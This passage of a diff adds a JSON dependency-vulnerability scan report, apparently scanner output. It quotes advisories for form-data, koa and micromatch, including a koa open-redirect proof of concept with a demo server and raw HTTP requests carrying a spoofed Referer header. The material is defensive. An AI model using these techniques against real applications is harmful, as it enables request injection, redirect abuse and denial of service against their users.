+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.5.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7783"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/benweissmann/CVE-2025-7783-poc"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/form-data/form-data"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-330"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-21T19:04:54Z",
+                "nvd_published_at": "2025-07-18T17:15:44Z",
+                "severity": "CRITICAL"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "aliases": [
+                "CVE-2025-7783",
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "max_severity": "9.4"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "form-data",
+            "version": "2.5.3",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-07-21T19:04:54Z",
+              "published": "2025-07-21T19:04:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-fjxv-7rqg-78g4",
+              "aliases": [
+                "CVE-2025-7783"
+              ],
+              "related": [
+                "CGA-35hh-78jw-8mmq",
+                "CGA-9m6x-qcrx-9xfj",
+                "CGA-cvhq-qgx3-vfx9",
+                "CGA-g2fp-rgfq-2hjj",
+                "CGA-h6v7-23w8-2vw8",
+                "CGA-mp9r-pq3p-q3qc",
+                "CGA-pgwm-362h-3mjh",
+                "CGA-qvfw-fcfj-g5xq",
+                "CGA-rvcj-gcgm-25q3",
+                "CGA-xvgg-cqm9-vxh5",
+                "CVE-2025-7783"
+              ],
+              "summary": "form-data uses unsafe random function in form-data for choosing boundary",
+              "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.5.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7783"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/benweissmann/CVE-2025-7783-poc"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/form-data/form-data"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-330"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-21T19:04:54Z",
+                "nvd_published_at": "2025-07-18T17:15:44Z",
+                "severity": "CRITICAL"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "aliases": [
+                "CVE-2025-7783",
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "max_severity": "9.4"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "form-data",
+            "version": "4.0.3",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-07-21T19:04:54Z",
+              "published": "2025-07-21T19:04:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-fjxv-7rqg-78g4",
+              "aliases": [
+                "CVE-2025-7783"
+              ],
+              "related": [
+                "CGA-35hh-78jw-8mmq",
+                "CGA-9m6x-qcrx-9xfj",
+                "CGA-cvhq-qgx3-vfx9",
+                "CGA-g2fp-rgfq-2hjj",
+                "CGA-h6v7-23w8-2vw8",
+                "CGA-mp9r-pq3p-q3qc",
+                "CGA-pgwm-362h-3mjh",
+                "CGA-qvfw-fcfj-g5xq",
+                "CGA-rvcj-gcgm-25q3",
+                "CGA-xvgg-cqm9-vxh5",
+                "CVE-2025-7783"
+              ],
+              "summary": "form-data uses unsafe random function in form-data for choosing boundary",
+              "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.5.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7783"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/benweissmann/CVE-2025-7783-poc"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/form-data/form-data"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-330"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-21T19:04:54Z",
+                "nvd_published_at": "2025-07-18T17:15:44Z",
+                "severity": "CRITICAL"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "aliases": [
+                "CVE-2025-7783",
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "max_severity": "9.4"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "koa",
+            "version": "2.15.3",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-02-12T19:27:07Z",
+              "published": "2025-02-12T19:23:09Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-593f-38f6-jp5m",
+              "aliases": [
+                "CVE-2025-25200"
+              ],
+              "summary": "Inefficient Regular Expression Complexity in koa",
+              "details": "### Summary\nKoa uses an evil regex to parse the `X-Forwarded-Proto` and `X-Forwarded-Host` HTTP headers. This can be exploited to carry out a Denial-of-Service attack.\n\n### PoC\n\nComing soon.\n\n### Impact\nThis is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.15.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-593f-38f6-jp5m/GHSA-593f-38f6-jp5m.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0-alpha.0"
+                        },
+                        {
+                          "fixed": "3.0.0-alpha.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-593f-38f6-jp5m/GHSA-593f-38f6-jp5m.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.7.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-593f-38f6-jp5m/GHSA-593f-38f6-jp5m.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.21.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-593f-38f6-jp5m/GHSA-593f-38f6-jp5m.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-25200"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/koajs/koa"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/releases/tag/2.15.4"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-02-12T19:23:09Z",
+                "nvd_published_at": "2025-02-12T18:15:28Z",
+                "severity": "CRITICAL"
+              }
+            },
+            {
+              "modified": "2025-07-30T14:14:46Z",
+              "published": "2025-07-29T19:11:25Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-jgmv-j7ww-jx2x",
+              "aliases": [
+                "CVE-2025-8129"
+              ],
+              "summary": "Koa Open Redirect via Referrer Header (User-Controlled)",
+              "details": "## Summary\nIn the latest version of Koa, the back method used for redirect operations adopts an insecure implementation, which uses the user-controllable referrer header as the redirect target.\n\n## Details\non the API document https://www.koajs.net/api/response#responseredirecturl-alt, we can see:\n\n**response.redirect(url, [alt])**\n```\nPerforms a [302] redirect to url.\nThe string \"back\" is specially provided for Referrer support, using alt or \"/\" when Referrer does not exist.\n\nctx.redirect('back');\nctx.redirect('back', '/index.html');\nctx.redirect('/login');\nctx.redirect('http://google.com');\n\n```\nhowever, the \"back\" method is insecure:\n\n- https://github.com/koajs/koa/blob/master/lib/response.js#L322\n```\n  back (alt) {\n    const url = this.ctx.get('Referrer') || alt || '/'\n    this.redirect(url)\n  },\n```\nReferrer Header is User-Controlled.\n\n\n## PoC\n\n**there is a demo for POC:**\n```\nconst Koa = require('koa')\nconst serve = require('koa-static')\nconst Router = require('@koa/router')\nconst path = require('path')\n\nconst app = new Koa()\nconst router = new Router()\n\n// Serve static files from the public directory\napp.use(serve(path.join(__dirname, 'public')))\n\n// Define routes\nrouter.get('/test', ctx =\u003e {\n  ctx.redirect('back', '/index1.html')\n})\n\nrouter.get('/test2', ctx =\u003e {\n  ctx.redirect('back')\n})\n\nrouter.get('/', ctx =\u003e {\n  ctx.body = 'Welcome to the home page! Try accessing /test, /test2'\n})\n\napp.use(router.routes())\napp.use(router.allowedMethods())\n\nconst port = 3000\napp.listen(port, () =\u003e {\n  console.log(`Server running at http://localhost:${port}`)\n}) \n```\n**Proof Of Concept**\n```\nGET /test HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n\n\nGET /test2 HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n```\n![image](https://github.com/user-attachments/assets/03d1e61b-df97-4b42-a0c4-437bd17144db)\n\n![image](https://github.com/user-attachments/assets/f4e076e0-3853-4b7a-b4c0-bddf5b67631a)\n\n\n## Impact\nhttps://learn.snyk.io/lesson/open-redirect/",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.16.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0-alpha.0"
+                        },
+                        {
+                          "fixed": "3.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/security/advisories/GHSA-jgmv-j7ww-jx2x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54420"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/issues/1892"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/issues/1892#issue-3213028583"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/commit/422c551c63d00f24e2bbbdf492f262a5935bb1f0"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/koajs/koa"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?ctiid.317514"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?id.317514"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?submit.619741"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-601"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-29T19:11:25Z",
+                "nvd_published_at": "2025-07-29T17:15:33Z",
+                "severity": "LOW"
+              }
+            },
+            {
+              "modified": "2025-04-09T20:29:43Z",
+              "published": "2025-04-09T13:00:07Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-x2rg-q646-7m2v",
+              "aliases": [
+                "CVE-2025-32379"
+              ],
+              "summary": "Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function",
+              "details": "### Summary\nIn koa \u003c 2.16.1 and \u003c 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.\n\n### Patches\nThis issue is patched in  2.16.1 and 3.0.0-alpha.5.\n\n### PoC\nComing soon...\n\n### Impact\n1. Redirect user to another phishing site\n2. Make request to another endpoint of the application based on user's cookie\n3. Steal user's cookie",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.16.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-x2rg-q646-7m2v/GHSA-x2rg-q646-7m2v.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "3.0.0-alpha.1"
+                        },
+                        {
+                          "fixed": "3.0.0-alpha.5"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-x2rg-q646-7m2v/GHSA-x2rg-q646-7m2v.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32379"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/koajs/koa"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-04-09T13:00:07Z",
+                "nvd_published_at": "2025-04-09T16:15:25Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-593f-38f6-jp5m"
+              ],
+              "aliases": [
+                "CVE-2025-25200",
+                "GHSA-593f-38f6-jp5m"
+              ],
+              "max_severity": "9.2"
+            },
+            {
+              "ids": [
+                "GHSA-jgmv-j7ww-jx2x"
+              ],
+              "aliases": [
+                "CVE-2025-8129",
+                "GHSA-jgmv-j7ww-jx2x"
+              ],
+              "max_severity": "3.5"
+            },
+            {
+              "ids": [
+                "GHSA-x2rg-q646-7m2v"
+              ],
+              "aliases": [
+                "CVE-2025-32379",
+                "GHSA-x2rg-q646-7m2v"
+              ],
+              "max_severity": "5.0"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "micromatch",
+            "version": "3.1.10",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2024-08-28T13:12:26Z",
+              "published": "2024-05-14T18:30:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-952p-6rrq-rcjv",
+              "aliases": [
+                "CVE-2024-4067"
+              ],
+              "related": [
+                "CGA-6q83-777j-gp5r",
+                "CGA-7j2f-jxvw-gx52",
+                "CGA-9hv5-rmvp-37vw",
+                "CGA-9qj8-ph43-6pq5"
+              ],
+              "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
+              "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "micromatch",
+                    "purl": "pkg:npm/micromatch"
+                  },
+                  "ranges": [
